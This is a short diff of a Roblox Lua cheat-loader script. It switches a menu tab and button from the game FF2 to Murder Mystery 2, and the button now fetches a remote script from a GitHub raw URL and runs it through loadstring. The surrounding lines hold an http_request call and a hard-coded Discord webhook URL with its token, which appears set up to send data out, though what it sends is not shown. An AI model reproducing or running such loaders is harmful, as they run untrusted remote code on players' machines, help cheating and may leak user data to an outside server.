@@ -141,12 +141,12 @@ http_request({
     end,
  })
 
-local Tab = Window:CreateTab("FF2🏈", 4483362458) -- Title, Image
+local Tab = Window:CreateTab("MM2", 4483362458) -- Title, Image
 
  local Button = Tab:CreateButton({
-    Name = "Load FF2 Script 🏈",
+    Name = "Load Murder Mystery 2 Script",
     Callback = function()
-        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fbc2575adb9f0ac228d8971bcbfa4f8b.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AscendFromHeaven/Kitsune-Hub/refs/heads/main/WhitelistMM2"))()
         local HttpService = game:GetService("HttpService")
 local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
  
